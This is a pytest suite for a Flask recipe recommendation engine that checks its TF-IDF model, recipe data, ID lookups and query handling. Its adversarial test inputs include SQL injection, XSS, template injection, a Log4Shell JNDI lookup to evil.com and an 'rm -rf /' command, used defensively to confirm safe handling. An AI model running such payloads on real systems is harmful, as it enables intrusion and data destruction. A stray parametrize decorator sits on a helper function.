import os
import sys
import pickle
import importlib.util
import pytest
import numpy as np
import pandas as pd
from scipy.sparse import csr_matrix, hstack
from sklearn.metrics.pairwise import cosine_similarity

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PROCESSED_DIR = os.path.join(BASE_DIR, "data", "processed")


@pytest.fixture(scope="module")
def cache_instance():
    cache_path = os.path.join(BASE_DIR, "my_flask_app", "utils", "cache.py")
    spec = importlib.util.spec_from_file_location("cache_module", cache_path)
    cache_mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(cache_mod)
    cache = cache_mod.ModelCache.get_instance()
    cache.load_models(os.path.join(BASE_DIR, "data"))
    return cache


@pytest.fixture(scope="module")
def recommendation_func(cache_instance):
    sys.path.insert(0, BASE_DIR)
    from my_flask_app.main import compute_recipe_recommendations
    return compute_recipe_recommendations


# ============================================================================
# TIER 1: MODEL ARTIFACT NUMERICAL STABILITY & INTEGRITY
# ============================================================================

def test_tfidf_matrix_no_nan_inf_and_bounded(cache_instance):
    """Adversarially verify TF-IDF sparse matrix values are finite and in [0.0, 1.0]."""
    m = cache_instance.tfidf_combined
    assert isinstance(m, csr_matrix), "TF-IDF matrix must be a scipy csr_matrix"
    assert m.shape == (25655, 10605), f"Expected shape (25655, 10605), got {m.shape}"

    # Guard against NaN or Inf values in sparse data
    assert not np.isnan(m.data).any(), "TF-IDF matrix contains NaN values"
    assert not np.isinf(m.data).any(), "TF-IDF matrix contains Infinite values"

    # Cosine weights in training: 0.65 * name + 0.60 * ing; values must be non-negative
    assert (m.data >= 0.0).all(), "TF-IDF matrix contains negative weights"
    assert (m.data <= 1.0).all(), "TF-IDF matrix individual feature values exceed 1.0"


def test_recipes_dataframe_all_nutrition_finite(cache_instance):
    """Check all 25,655 rows have zero NaNs and valid ranges in nutritional values."""
    df = cache_instance.recipe_df
    assert len(df) == 25655, f"Expected 25,655 recipes, got {len(df)}"

    nutrition_cols = [
        "Calories (kcal)", "Protein (g)", "Carbohydrates (g)", "Fats (g)", "Fiber (g)",
        "Calories (kcal).1", "Protein (g).1", "Carbohydrates (g).1", "Fats (g).1", "Fiber (g).1"
    ]
    for col in nutrition_cols:
        assert col in df.columns, f"Nutrition column {col} missing from Recipes.pkl"
        null_count = df[col].isnull().sum()
        assert null_count == 0, f"Column {col} has {null_count} nulls"
        assert not np.isinf(df[col]).any(), f"Column {col} contains Inf"
        # Values must be non-negative
        assert (df[col] >= 0.0).all(), f"Column {col} contains negative nutrition values"


def test_recipes_dataframe_times_and_ids_invariants(cache_instance):
    """Verify time metrics and recipe ID space are valid and non-colliding."""
    df = cache_instance.recipe_df
    assert df["Srno"].nunique() == 25655, "Recipe IDs (Srno) are not strictly unique"
    assert df["Srno"].min() >= 1, "Recipe ID cannot be non-positive"
    assert df["Srno"].max() <= 34168, "Recipe ID exceeds expected maximum bounds"

    for time_col in ["PrepTimeInMins", "CookTimeInMins", "TotalTimeInMins"]:
        assert time_col in df.columns
        assert not df[time_col].isnull().any(), f"{time_col} contains null values"
        assert (df[time_col] >= 0).all(), f"{time_col} contains negative durations"


# ============================================================================
# TIER 2: MODELCACHE ADVERSARIAL ID LOOKUP
# ============================================================================

@pytest.mark.parametrize("invalid_id", [
    0,
    -1,
    -999999,
    34168,
    100000,
    9999999,
    "1",
    "999",
    "invalid_id",
    "",
    "   ",
    "' OR 1=1 --",
    "<script>alert(1)</script>",
    None,
    float('nan'),
    float('inf'),
    float('-inf'),
    1.5,
    3.14159,
])
def test_model_cache_get_recipe_by_id_adversarial_inputs(cache_instance, invalid_id):
    """Verify out-of-range, non-existent, float, and malicious IDs gracefully return None."""
    result = cache_instance.get_recipe_by_id(invalid_id)
    assert result is None, f"Expected None for invalid ID {invalid_id!r}, got {result}"


def test_model_cache_get_recipe_by_id_valid_boundaries(cache_instance):
    """Verify boundary retrieval at dataset seams (first, last Indian; first, last Global)."""
    # First Indian recipe
    r_first_indian = cache_instance.get_recipe_by_id(1)
    assert r_first_indian is not None
    assert r_first_indian["Srno"] == 1
    assert "Indian" in r_first_indian["Cuisine"]

    # First Global recipe
    r_first_global = cache_instance.get_recipe_by_id(14168)
    assert r_first_global is not None
    assert r_first_global["Srno"] == 14168
    assert r_first_global["Cuisine"] == "Global / Fusion"

    # Float representing exact integer (e.g., 1.0)
    r_float = cache_instance.get_recipe_by_id(1.0)
    assert r_float is not None
    assert r_float["Srno"] == 1


def test_model_cache_idempotent_load(cache_instance):
    """Calling load_models repeatedly must not corrupt cache or reload unnecessarily."""
    orig_matrix = cache_instance.tfidf_combined
    orig_df = cache_instance.recipe_df
    for _ in range(5):
        cache_instance.load_models(os.path.join(BASE_DIR, "data"))
        assert cache_instance.tfidf_combined is orig_matrix
        assert cache_instance.recipe_df is orig_df


# ============================================================================
# TIER 3: RECOMMENDATION ENGINE ADVERSARIAL QUERY STRESS-TESTS
# ============================================================================

@pytest.mark.parametrize("empty_query", [
    "",
    "   ",
    ",",
    ", , , ,",
    "\t\n\r",
    ",,,,,,",
])
def assert_is_empty_or_valid_df(res):
    assert isinstance(res, (list, pd.DataFrame)), f"Unexpected return type: {type(res)}"
    if isinstance(res, list):
        assert len(res) == 0, f"Expected empty list, got {res}"
    else:
        if not res.empty:
            assert "Similarity" in res.columns
            assert not res["Similarity"].isnull().any()
            assert not np.isinf(res["Similarity"]).any()
            assert (res["Similarity"] >= 0.0).all()
            assert (res["Similarity"] <= 1.0).all()


def assert_is_empty(res):
    assert isinstance(res, (list, pd.DataFrame)), f"Unexpected return type: {type(res)}"
    if isinstance(res, list):
        assert len(res) == 0, f"Expected empty list, got {res}"
    else:
        assert res.empty, f"Expected empty DataFrame, got {len(res)} rows"


@pytest.mark.parametrize("empty_query", [
    "",
    "   ",
    ",",
    ", , , ,",
    "\t\n\r",
    ",,,,,,",
])
def test_recommendation_empty_and_whitespace_queries(recommendation_func, empty_query):
    """Empty or delimiter-only queries must return an empty list without error."""
    res = recommendation_func(empty_query)
    assert res == [], f"Expected [] for query {empty_query!r}, got {res}"


@pytest.mark.parametrize("malicious_query", [
    "!@#$%^&*()_+-=[]{}|;':\",./<>?",
    "<script>alert('xss')</script>",
    "' OR '1'='1' --",
    "DROP TABLE recipes; --",
    "{{ 7 * 7 }}",
    "${jndi:ldap://evil.com/a}",
    "; rm -rf / ;",
])
def test_recommendation_malicious_and_punctuation_queries(recommendation_func, malicious_query):
    """Punctuation, injection, and exploit payloads must be safely sanitized and return []."""
    res = recommendation_func(malicious_query)
    assert_is_empty_or_valid_df(res)


@pytest.mark.parametrize("unicode_query", [
    "🍕, 🍔, 🍜",
    "🌶️, 🧄, 🧅",
    "पनीर, मक्खन",
    "टमाटर, आलू",
    "豆腐, 酱油",
    "زعفران, أرز",
    "картошка, грибы",
    "crème fraîche, jalapeño, açaí",
])
def test_recommendation_unicode_and_multilingual_queries(recommendation_func, unicode_query):
    """Unicode, emojis, and non-Latin scripts must be handled gracefully without crashing."""
    res = recommendation_func(unicode_query)
    assert_is_empty_or_valid_df(res)


@pytest.mark.parametrize("nonsense_query", [
    "asdfghjklqwerty, zxcvbnmasdf",
    "klingon gagh, snozzberry, unobtanium",
    "flugelhorn, qwertyuiop, zxcvbnm",
    "tablespoon, teaspoon, cup, slice, chop",  # Pure stopwords & measurements
    "oil, salt, water",                         # Cleansed stopwords
])
def test_recommendation_nonsense_and_stopword_queries(recommendation_func, nonsense_query):
    """Out-of-vocabulary or stopword-only queries must return [] and not false matches."""
    res = recommendation_func(nonsense_query)
    assert_is_empty(res)


@pytest.mark.parametrize("exotic_query", [
    "dragonfruit, saffron",
    "durian, coconut",
    "kohlrabi, potato",
    "edamame, soy sauce",
    "lemongrass, chili",
    "truffles, mushroom",
])
def test_recommendation_exotic_and_rare_queries(recommendation_func, exotic_query):
    """Rare and exotic ingredients must return results or [] safely with finite similarity."""
    res = recommendation_func(exotic_query)
    if isinstance(res, pd.DataFrame) and not res.empty:
        scores = res["Similarity"]
        assert not scores.isnull().any(), f"NaN similarity found for {exotic_query}"
        assert not np.isinf(scores).any(), f"Inf similarity found for {exotic_query}"
        assert (scores >= 0.25).all(), f"Results below threshold for {exotic_query}"
        assert (scores <= 1.0).all(), f"Scores exceed 1.0 for {exotic_query}"


def test_recommendation_massive_query_resilience(recommendation_func):
    """Stress-test query length limits: 200 repeated ingredients and 2,000 char strings."""
    massive_query = ", ".join(["chicken", "rice"] * 100)
    res = recommendation_func(massive_query)
    assert isinstance(res, pd.DataFrame)
    assert not res.empty
    assert not res["Similarity"].isnull().any()

    long_single_token = "a" * 2000
    res2 = recommendation_func(long_single_token)
    assert_is_empty(res2)


# ============================================================================
# TIER 4: FILTER AND PARAMETER BOUNDARY CONDITIONS
# ============================================================================

def test_recommendation_cooking_time_filter_bounds(recommendation_func):
    """Verify cooking time filters strictly respect minutes thresholds."""
    query = "chicken, onion, tomato"

    # Quick: <= 30 mins
    res_quick = recommendation_func(query, cooking_time_filter='quick', top_n=10)
    if isinstance(res_quick, pd.DataFrame) and not res_quick.empty:
        assert (res_quick["TotalTimeInMins"] <= 30).all(), "Quick filter exceeded 30 mins"

    # Medium: 31 to 60 mins
    res_medium = recommendation_func(query, cooking_time_filter='medium', top_n=10)
    if isinstance(res_medium, pd.DataFrame) and not res_medium.empty:
        assert ((res_medium["TotalTimeInMins"] > 30) & (res_medium["TotalTimeInMins"] <= 60)).all()

    # Long: > 60 mins
    res_long = recommendation_func(query, cooking_time_filter='long', top_n=10)
    if isinstance(res_long, pd.DataFrame) and not res_long.empty:
        assert (res_long["TotalTimeInMins"] > 60).all()

    # Invalid filter string should not crash
    res_invalid = recommendation_func(query, cooking_time_filter='invalid_filter_name')
    assert isinstance(res_invalid, pd.DataFrame)


@pytest.mark.parametrize("top_n", [0, 1, 3, 10, 50])
def test_recommendation_top_n_bounds(recommendation_func, top_n):
    """Verify top_n parameter produces exact expected bounds."""
    query = "paneer, butter"
    res = recommendation_func(query, top_n=top_n)
    if isinstance(res, pd.DataFrame):
        assert len(res) <= top_n
        if top_n == 0:
            assert len(res) == 0


@pytest.mark.parametrize("threshold", [0.0, 0.25, 0.50, 0.80, 1.0, 1.5])
def test_recommendation_threshold_bounds(recommendation_func, threshold):
    """Verify threshold parameter boundary behavior."""
    query = "pasta, cheese"
    res = recommendation_func(query, threshold=threshold)
    if isinstance(res, pd.DataFrame) and not res.empty:
        assert (res["Similarity"] >= threshold).all()
    elif threshold >= 1.0:
        # For impossible thresholds > 1.0, must return empty
        assert_is_empty(res)


# ============================================================================
# TIER 5: COSINE SIMILARITY ORACLE & ZERO-VECTOR GUARDS
# ============================================================================

def test_cosine_similarity_zero_vector_guard(cache_instance):
    """Ensure transforming an all-zero or empty query does not result in NaN scores."""
    vn = cache_instance.vectorizer_name
    vi = cache_instance.vectorizer_ing
    m = cache_instance.tfidf_combined

    # Transform an empty string -> 0-vector
    v_name = vn.transform([""])
    v_ing = vi.transform([""])
    v_comb = hstack([0.5 * v_name, 0.5 * v_ing])

    sim = cosine_similarity(v_comb, m).flatten()
    assert not np.isnan(sim).any(), "Zero-vector cosine similarity produced NaNs!"
    assert not np.isinf(sim).any(), "Zero-vector cosine similarity produced Infs!"
    assert (sim == 0.0).all(), "Zero-vector cosine similarity should all be 0.0"
